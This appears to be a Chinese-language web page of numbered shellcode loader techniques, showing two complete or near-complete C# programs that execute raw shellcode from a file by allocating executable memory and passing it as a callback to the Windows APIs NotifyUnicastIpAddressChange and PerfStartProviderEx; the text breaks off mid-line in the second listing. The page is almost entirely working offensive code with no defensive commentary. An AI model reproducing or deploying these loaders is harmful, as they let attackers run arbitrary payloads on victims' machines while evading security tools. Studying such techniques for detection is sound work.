<h1 id="h11cnotifyunicastipaddresschange"><span>11.回调函数注入 (C#) 通过 NotifyUnicastIpAddressChange</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">NotifyUnicastIpAddressChange</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;NotifyUnicastIpAddressChange.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hNotification&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;AF_INET&nbsp;=&nbsp;<span class="hljs-number">2</span>;<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NotifyUnicastIpAddressChange(AF_INET,&nbsp;hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-literal">true</span>,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;hNotification);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Iphlpapi.dll"</span>)</span>]<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">NotifyUnicastIpAddressChange</span>(<span class="hljs-params"><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Family,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;CallerContext,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;InitialNotification,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;IntPtr&nbsp;NotificationHandle</span>)</span>;<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">67</span>}<br></code></pre>
<h1 id="h12cperfstartproviderex"><span>12.回调函数注入 (C#) 通过 PerfStartProviderEx</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">PerfStartProviderEx</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;PerfStartProviderEx.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Guid&nbsp;ProviderGuid&nbsp;=&nbsp;Guid.NewGuid();<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PERF_PROVIDER_CONTEXT&nbsp;sPPC&nbsp;=&nbsp;<span class="hljs-keyword">new</span>&nbsp;PERF_PROVIDER_CONTEXT();<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sPPC.MemAllocRoutine&nbsp;=&nbsp;hAlloc;<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sPPC.ContextSize&nbsp;=&nbsp;(<span class="hljs-keyword">uint</span>)Marshal.SizeOf(sPPC);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProvider&nbsp;=&nbsp;IntPtr.Zero;<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfStartProviderEx(<span class="hljs-keyword">ref</span>&nbsp;ProviderGuid,&nbsp;<span class="hljs-keyword">ref</span>&nbsp;sPPC,&nbsp;<span class="hljs-keyword">out</span>&nbsp;hProvider);<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Close&nbsp;provider&nbsp;handle</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PerfStopProvider(hProvider);<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">66</span><br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"advapi32.dll"</span>)</span>]<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;<span class="hljs-title">PerfStartProviderEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;Guid&nbsp;ProviderGuid,<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ref</span>&nbsp;PERF_PROVIDER_CONTEXT&nbsp;ProviderContext,<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;IntPtr&nbsp;hProvider</span>)</span>;<br><span class="linenum hljs-number">72</span><br><span class="linenum 